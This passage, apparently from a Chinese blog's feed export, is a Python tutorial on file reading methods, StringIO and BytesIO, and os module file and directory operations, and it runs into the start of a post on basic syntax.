<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"></span><br><span class="line">line = fo.readline()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;读取第一行 %s&quot;</span> % (line))</span><br><span class="line"></span><br><span class="line">line = fo.readline(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;读取的字符串为: %s&quot;</span> % (line))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT:</span><br><span class="line">文件名为:  runoob.txt</span><br><span class="line">读取第一行 www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">读取的字符串为: www.r</span><br></pre></td></tr></table></figure>

<br>


<br>

<h4 id="1-6-f-readlines"><a href="#1-6-f-readlines" class="headerlink" title="1.6 f.readlines()"></a><font color="#3CB371" face="Comic sans MS">1.6 f.readlines()</font></h4><p>概述<br>readlines() 方法用于读取所有行(直到结束符 EOF)并返回列表，该列表可以由 Python 的 for… in … 结构进行处理。 如果碰到结束符 EOF 则返回空字符串。</p>
<p>如果碰到结束符 EOF 则返回空字符串。<br>关于EOF可参考：<font color="#00B2EE">[<a href="https://blog.csdn.net/polar9527/article/details/38518703">文件结束符EOF</a>]</font> </p>
<br>

<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">fileObject.readlines( )</td>
<td align="left">无参数</td>
<td align="left">返回列表，包含所有的行。</td>
</tr>
</tbody></table>
<br>

<p>实例<br>以下实例演示了 readline() 方法的使用：</p>
<p>文件 runoob.txt 的内容如下：</p>
<p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">请自行区分下面两种输出方式：</span><br><span class="line"></span><br><span class="line">（<span class="number">1</span>）<span class="comment"># 打开文件</span></span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(fo.readlines())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">[<span class="string">&quot;www.runoob.com&#x27;\\n&#x27;\n&quot;</span>, <span class="string">&#x27;www.runoob.com\n&#x27;</span>, <span class="string">&#x27;www.runoob.com\n&#x27;</span>, <span class="string">&#x27;www.runoob.com\n&#x27;</span>, <span class="string">&#x27;www.runoob.com&#x27;</span>]</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">（<span class="number">2</span>）<span class="comment"># 打开文件</span></span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> fo.readlines():                          <span class="comment">#依次读取每行  </span></span><br><span class="line">    line = line.strip()                             <span class="comment">#去掉每行头尾空白  </span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;读取的数据为: %s&quot;</span> % (line))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">文件名为:  runoob.txt</span><br><span class="line">读取的数据为: www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">读取的数据为: www.runoob.com</span><br><span class="line">读取的数据为: www.runoob.com</span><br><span class="line">读取的数据为: www.runoob.com</span><br><span class="line">读取的数据为: www.runoob.com</span><br></pre></td></tr></table></figure>


<br>


<br>

<h4 id="1-7-f-tell"><a href="#1-7-f-tell" class="headerlink" title="1.7 f.tell()"></a><font color="#3CB371" face="Comic sans MS">1.7 f.tell()</font></h4><p>f.tell() 返回文件对象当前所处的位置, 它是从文件开头开始算起的字节数。</p>
<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">f.tell()</td>
<td align="left">无参数</td>
<td align="left">返回文件指针的当前位置（整数）</td>
</tr>
</tbody></table>
<br>

<p>实例<br>以下实例演示了 readline() 方法的使用：</p>
<p>文件 runoob.txt 的内容如下：</p>
<p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"> </span><br><span class="line">line = fo.readline()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;读取的数据为: %s&quot;</span> % (line))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 获取当前文件位置</span></span><br><span class="line">pos = fo.tell()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;当前位置: %d&quot;</span> % (pos))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">文件名为:  runoob.txt</span><br><span class="line">读取的数据为: www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">当前位置: <span class="number">20</span></span><br></pre></td></tr></table></figure>

<br>


<br>

<h4 id="1-8-f-seek"><a href="#1-8-f-seek" class="headerlink" title="1.8 f.seek()"></a><font color="#3CB371" face="Comic sans MS">1.8 f.seek()</font></h4><p>如果要改变文件当前的位置, 可以使用 f.seek(offset, from_what) 函数。</p>
<p>from_what 的值, 如果是 0 表示开头, 如果是 1 表示当前位置, 2 表示文件的结尾。from_what 值为默认为0，即文件开头。例如：</p>
<p>seek(x,0) ： 从起始位置即文件首行首字符开始移动 x 个字符<br>seek(x,1) ： 表示从当前位置往后移动x个字符<br>seek(-x,2)：表示从文件的结尾往前移动x个字符</p>
<table>
<thead>
<tr>
<th align="left">语法格式</th>
<th align="left">参数说明</th>
<th align="left">返回类型</th>
</tr>
</thead>
<tbody><tr>
<td align="left">f.seek(offset[, whence])</td>
<td align="left">offset： 开始的偏移量，也就是代表需要移动偏移的字节数，<br>如果是负数表示从倒数第几位开始。<br>whence：可选，默认值为 0。给 offset 定义一个参数，<br>表示要从哪个位置开始偏移；0 代表从文件开头开始算起，<br>1 代表从当前位置开始算起，2 代表从文件末尾算起。</td>
<td align="left">无返回值</td>
</tr>
</tbody></table>
<br>

<p>实例<br>以下实例演示了 readline() 方法的使用：</p>
<p>文件 runoob.txt 的内容如下：</p>
<p><code>www.runoob.com&#39;\n&#39;</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code><br><code>www.runoob.com</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 打开文件</span></span><br><span class="line">fo = <span class="built_in">open</span>(<span class="string">&quot;runoob.txt&quot;</span>, <span class="string">&quot;r+&quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;文件名为: &quot;</span>, fo.name)</span><br><span class="line"> </span><br><span class="line">line = fo.readline()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;读取的数据为: %s&quot;</span> % (line))</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 重新设置文件读取指针到开头</span></span><br><span class="line">fo.seek(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">line = fo.readline()</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;读取的数据为: %s&quot;</span> % (line))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">fo.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">文件名为:  runoob.txt</span><br><span class="line">读取的数据为: www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">读取的数据为: www.runoob.com<span class="string">&#x27;\n&#x27;</span></span><br></pre></td></tr></table></figure>

<br>


<br>

<h4 id="1-9-file-对象的方法"><a href="#1-9-file-对象的方法" class="headerlink" title="1.9 file 对象的方法"></a><font color="#3CB371" face="Comic sans MS">1.9 file 对象的方法</font></h4><br>

<table>
<thead>
<tr>
<th align="left">序号</th>
<th align="left">方法及描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">1</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.close()</a></font><br>关闭文件。关闭后文件不能再进行读写操作。</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.flush()</a></font> <br>刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件,<br>而不是被动的等待输出缓冲区写入。</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.fileno()</a></font> <br>返回一个整型的文件描述符(file descriptor FD 整型), <br>可以用在如os模块的read方法等一些底层操作上。</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.isatty()</a></font><br>如果文件连接到一个终端设备返回 True，否则返回 False。</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.next()</a></font> <br>返回文件下一行。</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.read([size])</a></font> <br>从文件读取指定的字节数，如果未给定或为负则读取所有。</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.readline([size])</a></font> <br>读取整行，包括 “\n” 字符。</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.readlines([sizeint])</a></font><br> 读取所有行并返回列表，若给定sizeint&gt;0，返回总和大约为sizeint字节的行, <br>实际读取值可能比 sizeint 较大, 因为需要填充缓冲区。</td>
</tr>
<tr>
<td align="left">9</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.seek(offset[, whence])</a></font> <br>设置文件当前位置</td>
</tr>
<tr>
<td align="left">10</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.tell()</a></font> <br>返回文件当前位置。</td>
</tr>
<tr>
<td align="left">11</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.truncate([size])</a></font> <br>从文件的首行首字符开始截断，截断文件为 size 个字符，无 size 表示从当前位置截断；<br>截断之后后面的所有字符被删除，其中 Widnows 系统下的换行代表2个字符大小。</td>
</tr>
<tr>
<td align="left">12</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.write(str)</a></font> <br>将字符串写入文件，返回的是写入的字符长度。</td>
</tr>
<tr>
<td align="left">13</td>
<td align="left"><font color="#00B2EE"><a href="https://blog.csdn.net/polar9527/article/details/38518703">file.writelines(sequence)</a></font> <br>向文件写入一个序列字符串列表，如果需要换行则要自己加入每行的换行符。</td>
</tr>
</tbody></table>
<br>

<br>

<h3 id="二-在内存读写"><a href="#二-在内存读写" class="headerlink" title="二. 在内存读写"></a><font color="#FF6347" face="Comic sans MS">二. 在内存读写</font></h3><p>可参考：<br><font color="#00B2EE">[<a href="https://blog.51cto.com/limingyu/2320441?source=dra">StringIO和BytesIO</a>]</font><br><font color="#00B2EE">[<a href="https://www.jianshu.com/p/b74a83e0f9fc">Python文件读写、StringIO和BytesIO</a>]</font></p>
<br>

<p>IO在计算机中指Input&#x2F;Output，也就是输入和输出。由于程序和运行时数据是在内存中驻留，由CPU这个超快的计算核心来执行，涉及到数据交换的地方，通常是磁盘、网络等，就需要IO接口。</p>
<p>由于CPU和内存的速度远远高于外设的速度，所以，在IO编程中，就存在速度严重不匹配的问题。举个例子来说，比如要把100M的数据写入磁盘，CPU输出100M的数据只需要0.01秒，可是磁盘要接收这100M数据可能需要10秒，怎么办呢？有两种办法：</p>
<p>第一种是CPU等着，也就是程序暂停执行后续代码，等100M的数据在10秒后写入磁盘，再接着往下执行，这种模式称为同步IO；</p>
<p>另一种方法是CPU不等待，只是告诉磁盘，“您老慢慢写，不着急，我接着干别的事去了”，于是，后续代码可以立刻接着执行，这种模式称为异步IO。</p>
<p>很明显，使用异步IO来编写程序性能会远远高于同步IO，但是异步IO的缺点是编程模型复杂。</p>
<p>操作IO的能力都是由操作系统提供的，每一种编程语言都会把操作系统提供的低级C接口封装起来方便使用，Python也不例外。我们后面会详细讨论Python的IO编程接口。</p>
<p>注意，本章的IO编程都是同步模式，异步IO由于复杂度太高，后续涉及到服务器端程序开发时我们再讨论。</p>
<br>

<p>就单独说一下Python的input()和print()：</p>
<p><strong>input()：</strong> 在控制台把数据输入到内存中，然后从内存中把数据以字符串形式返回给调用处；</p>
<p><strong>print()：</strong> 从内存中输出括号里的相对应的信息。</p>
<br>

<h4 id="2-1-StringIO"><a href="#2-1-StringIO" class="headerlink" title="2.1 StringIO"></a><font color="#3CB371" face="Comic sans MS">2.1 StringIO</font></h4><p>很多时候，数据读写不一定是文件，也可以在<font color="#FF7F00"><strong>内存中</strong></font>读写。</p>
<p>StringIO是IO模块中的类，所以使用的时候要引用模块： <code>from io import StringIO</code></p>
<p>StringIO顾名思义就是<font color="#FF7F00"><strong>在内存中读写str</strong></font>。</p>
<ul>
<li><p>内存中，开辟的一个文本模式的buffer,可以像文件对象一样操作它；</p>
</li>
<li><p>当使用close()前写入的数据是<font color="#FF7F00"><strong>使用追加模式</strong></font>；</p>
</li>
<li><p>当close方法被调用的时候，这个buffer会被释放；</p>
</li>
</ul>
<p><strong>好处：</strong></p>
<p>  一般来说，磁盘的操作比内存的操作要慢得多；内存足够的情况下，一般的优化思路是少落地，减少磁盘IO的过程，可以大大提高程序的运行效率。</p>
<blockquote>
<p><strong>使用到的方法：</strong></p>
</blockquote>
<ul>
<li><font color="#FF7F00"><strong>StringIO()：</strong></font>创建一个StringIO对象，类似文件的<code>open()</code>方法，创建的这个对象要赋值给一个变量；</li>
<li><font color="#FF7F00"><strong>f.write(‘String’)：</strong></font>将字符String写入到内存，返回写入的字节数（一个字符按一个字节算）；</li>
<li><font color="#FF7F00"><strong>f.getvalue(size)：</strong></font>从内存中读取size个字节（一个字符按一个字节算），若无参数则读取全部字节；</li>
<li><font color="#FF7F00"><strong>f.readable()：</strong></font>判断IO是否可读；</li>
<li><font color="#FF7F00"><strong>f.writable()：</strong></font>判断IO是否可写；</li>
<li><font color="#FF7F00"><strong>f.seekable()：</strong></font>指针是否可操作。</li>
</ul>
<p>要把str写入StringIO，我们需要先创建一个StringIO，然后，像文件一样写入即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="comment">#内存中构建</span></span><br><span class="line">f = StringIO()<span class="comment">#像文件对象一样操作  这里一定要赋值给一个变量!</span></span><br><span class="line"><span class="built_in">print</span>(f.readable(), f.writable(), f.seekable())</span><br><span class="line">f.write(<span class="string">&quot;Hello\nPython&quot;</span>)</span><br><span class="line">f.seek(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(f.readline())</span><br><span class="line"><span class="built_in">print</span>(f.getvalue())<span class="comment">#无视指针，输出全部内容</span></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line"><span class="literal">True</span> <span class="literal">True</span> <span class="literal">True</span></span><br><span class="line">Hello</span><br><span class="line"></span><br><span class="line">Hello</span><br><span class="line">Python</span><br></pre></td></tr></table></figure>

<br>

<br>

<h4 id="2-2-BytesIO"><a href="#2-2-BytesIO" class="headerlink" title="2.2 BytesIO"></a><font color="#3CB371" face="Comic sans MS">2.2 BytesIO</font></h4><p>StringIO操作的只能是str，如果要操作<font color="#FF7F00"><strong>二进制数据</strong></font>，就需要使用BytesIO。</p>
<p>BytesIO是IO模块中的类，所以使用的时候要引用模块：<code>from io import BytesIO</code></p>
<ul>
<li><p>内存中，开辟的一个二进制模式的buffer，可以像文件对象一样操作它；</p>
</li>
<li><p>当使用close()前写入的数据是<font color="#FF7F00"><strong>使用追加模式</strong></font>；</p>
</li>
<li><p>当close方法被调用的时候，这个buffer会被释放；</p>
</li>
<li><p>使用到的方法和StringIO一样，不过一个读的是字符一个读的是字节。</p>
</li>
</ul>
<br>

<p>BytesIO实现了在内存中读写bytes，我们创建一个BytesIO，然后写入一些bytes：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">ff = BytesIO()</span><br><span class="line"><span class="built_in">print</span>(ff.readable(), ff.writable(), ff.seekable())</span><br><span class="line">ff.write(<span class="string">b&#x27;Hello\nPython&#x27;</span>)</span><br><span class="line">ff.write(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">ff.seek(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(ff.readline())</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"><span class="built_in">print</span>(ff.getvalue())</span><br><span class="line">ff.close()</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line"><span class="literal">True</span> <span class="literal">True</span> <span class="literal">True</span></span><br><span class="line"><span class="string">b&#x27;Hello\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">b&#x27;Hello\nPython\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br></pre></td></tr></table></figure>


<br>

<p><strong>file-like对象</strong></p>
<p>类文件对象，可以像文件对象一样操作；</p>
<p>socket对象，输入输出对象(stdin、stdout)都是类文件对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> stdout</span><br><span class="line"></span><br><span class="line">f = stdout</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(f))</span><br><span class="line">f.write(<span class="string">&quot;90data.net&quot;</span>)</span><br><span class="line"></span><br><span class="line">OUTPUT：</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">_io</span>.<span class="title">TextIOWrapper</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">90<span class="title">data</span>.<span class="title">net</span></span></span><br></pre></td></tr></table></figure>



<br>

<br>

<h3 id="三-操作目录"><a href="#三-操作目录" class="headerlink" title="三. 操作目录"></a><font color="#FF6347" face="Comic sans MS">三. 操作目录</font></h3><p>如果我们要操作文件、目录，可以在命令行下面输入操作系统提供的各种命令来完成。比如dir、cp等命令。</p>
<p>如果要在Python程序中执行这些目录和文件的操作怎么办？其实操作系统提供的命令只是简单地调用了操作系统提供的接口函数，Python内置的<font color="#FF7F00"><strong>os模块</strong></font>也可以直接<font color="#FF7F00"><strong>调用操作系统提供的接口函数</strong></font>。</p>
<p><font face="Comic sans MS"><font color="#00B2EE">具体方法：[<a href="http://www.runoob.com/python3/python3-os-file-methods.html">Python3 OS 文件&#x2F;目录方法</a>]</font><br></font></p>
<p>打开Python交互式命令行，我们来看看如何使用os模块的基本功能：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(os.name)    <span class="string">&#x27;&#x27;&#x27;如果是posix，说明系统是Linux、Unix或Mac OS X，</span></span><br><span class="line"><span class="string">                   如果是nt，就是Windows系统。&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">os.uname()        <span class="string">&#x27;&#x27;&#x27;注意uname()函数在Windows上不提供，也就是说，</span></span><br><span class="line"><span class="string">                     os模块的某些函数是跟操作系统相关的。&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">os.environ        <span class="string">&#x27;&#x27;&#x27;在操作系统中定义的环境变量，全部保存在os.environ</span></span><br><span class="line"><span class="string">                     这个变量中&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">os.environ.get(<span class="string">&#x27;key&#x27;</span>)  <span class="string">&#x27;&#x27;&#x27;要获取某个环境变量的值，可以调用os.environ.get(&#x27;key&#x27;)，</span></span><br><span class="line"><span class="string">                        如os.environ.get(&#x27;PATH&#x27;)&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(os.path.abspath(<span class="string">&#x27;.&#x27;</span>))   <span class="string">&#x27;&#x27;&#x27;查看当前目录的绝对路径:&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<br>


<p><strong>操作文件和目录</strong></p>
<p>操作文件和目录的函数一部分放在os模块中，一部分放在os.path模块中，这一点要注意一下。查看、创建和删除目录可以这么调用：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">查看当前目录的绝对路径:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.abspath(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/Users/michael&#x27;</span></span><br><span class="line">在某个目录下创建一个新目录，首先把新目录的完整路径表示出来:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.join(<span class="string">&#x27;/Users/michael&#x27;</span>, <span class="string">&#x27;testdir&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;/Users/michael/testdir&#x27;</span></span><br><span class="line">然后创建一个目录:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.mkdir(<span class="string">&#x27;/Users/michael/testdir&#x27;</span>)</span><br><span class="line">删掉一个目录:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.rmdir(<span class="string">&#x27;/Users/michael/testdir&#x27;</span>)</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">把两个路径合成一个时，不要直接拼字符串，而要通过os.path.join()函数，这样可以正确处理不同</span><br><span class="line">操作系统的路径分隔符。在Linux/Unix/Mac下，os.path.join()返回这样的字符串：</span><br><span class="line"></span><br><span class="line">part-<span class="number">1</span>/part-<span class="number">2</span></span><br><span class="line"></span><br><span class="line">而Windows下会返回这样的字符串：</span><br><span class="line"></span><br><span class="line">part-<span class="number">1</span>\part-<span class="number">2</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os.path.split()函数，这样可以</span><br><span class="line">把一个路径拆分为两部分，后一部分总是最后级别的目录或文件名：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.split(<span class="string">&#x27;/Users/michael/testdir/file.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/Users/michael/testdir&#x27;</span>, <span class="string">&#x27;file.txt&#x27;</span>)</span><br><span class="line">os.path.splitext()可以直接让你得到文件扩展名，很多时候非常方便：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.splitext(<span class="string">&#x27;/path/to/file.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">同样的道理，要拆分路径时，也不要直接去拆字符串，而要通过os.path.split()函数，这样可以把一个路径拆分</span><br><span class="line">为两部分，后一部分总是最后级别的目录或文件名：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.split(<span class="string">&#x27;/Users/michael/testdir/file.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/Users/michael/testdir&#x27;</span>, <span class="string">&#x27;file.txt&#x27;</span>)</span><br><span class="line">os.path.splitext()可以直接让你得到文件扩展名，很多时候非常方便：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.path.splitext(<span class="string">&#x27;/path/to/file.txt&#x27;</span>)</span><br><span class="line">(<span class="string">&#x27;/path/to/file&#x27;</span>, <span class="string">&#x27;.txt&#x27;</span>)</span><br><span class="line">这些合并、拆分路径的函数并不要求目录和文件要真实存在，它们只对字符串进行操作。</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">文件操作使用下面的函数。假定当前目录下有一个test.txt文件：</span><br><span class="line"></span><br><span class="line"> 对文件重命名:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.rename(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test.py&#x27;</span>)</span><br><span class="line"> 删掉文件:</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.remove(<span class="string">&#x27;test.py&#x27;</span>)</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">但是复制文件的函数居然在os模块中不存在！原因是复制文件并非由操作系统提供的系统调用。理论上讲，我们</span><br><span class="line">通过上一节的读写文件可以完成文件复制，只不过要多写很多代码。</span><br><span class="line"></span><br><span class="line">幸运的是shutil模块提供了copyfile()的函数，你还可以在shutil模块中找到很多实用函数，它们可以看做是</span><br><span class="line">os模块的补充。</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">最后看看如何利用Python的特性来过滤文件。比如我们要列出当前目录下的所有目录，只需要一行代码：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> os.listdir(<span class="string">&#x27;.&#x27;</span>) <span class="keyword">if</span> os.path.isdir(x)]</span><br><span class="line">[<span class="string">&#x27;.lein&#x27;</span>, <span class="string">&#x27;.local&#x27;</span>, <span class="string">&#x27;.m2&#x27;</span>, <span class="string">&#x27;.npm&#x27;</span>, <span class="string">&#x27;.ssh&#x27;</span>, <span class="string">&#x27;.Trash&#x27;</span>, <span class="string">&#x27;.vim&#x27;</span>, <span class="string">&#x27;Applications&#x27;</span>, <span class="string">&#x27;Desktop&#x27;</span>, ...]</span><br><span class="line">要列出所有的.py文件，也只需一行代码：</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[x <span class="keyword">for</span> x <span class="keyword">in</span> os.listdir(<span class="string">&#x27;.&#x27;</span>) <span class="keyword">if</span> os.path.isfile(x) <span class="keyword">and</span> os.path.splitext(x)[<span class="number">1</span>]==<span class="string">&#x27;.py&#x27;</span>]</span><br><span class="line">[<span class="string">&#x27;apis.py&#x27;</span>, <span class="string">&#x27;config.py&#x27;</span>, <span class="string">&#x27;models.py&#x27;</span>, <span class="string">&#x27;pymonitor.py&#x27;</span>, <span class="string">&#x27;test_db.py&#x27;</span>, <span class="string">&#x27;urls.py&#x27;</span>, <span class="string">&#x27;wsgiapp.py&#x27;</span>]</span><br></pre></td></tr></table></figure>



<br>

<br>

<h3 id="四-序列化"><a href="#四-序列化" class="headerlink" title="四. 序列化"></a><font color="#FF6347" face="Comic sans MS">四. 序列化</font></h3><p>参读资料：<br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/00143192607210600a668b5112e4a979dd20e4661cc9c97000">廖雪峰的官方网站 序列化</a>》</font><br></font><br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.cnblogs.com/yyds/p/6563608.html">Python之数据序列化（json、pickle、shelve）</a>》</font><br></font><br><font face="Comic sans MS"><font color="#00B2EE">《<a href="https://www.cnblogs.com/zhangxinqi/p/8034380.html">python3之序列化（pickle&amp;json&amp;shelve）</a>》</font><br></font></p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-基础语法</title>
    <url>/post/Python-Grammar/</url>
    <content><![CDATA[<p>请务必注意，Python程序是<font color="#FF7F00"><strong>大小写敏感</strong></font>的，如果写错了大小写，程序会报错。</p>
<span id="more"></span>

<p>&amp;ensp;<br>&amp;ensp;</p>
<center><font color="#00B2EE" face="Comic sans MS" size=5>Python 基础语法</font> </center>

<p>&amp;emsp;<br>&amp;emsp;</p>
<h3 id="一-标识符"><a href="#一-标识符" class="headerlink" title="一. 标识符"></a><font color="#FF6347" face="Comic sans MS">一. 标识符</font></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>一、标识符定义规则</strong></font></p>
<ol>
<li><p>在 Python 里，标识符由<font color="#FF7F00"><strong>字母</strong></font>、<font color="#FF7F00"><strong>数字</strong></font>、<font color="#FF7F00"><strong>下划线</strong></font>组成。</p>
</li>
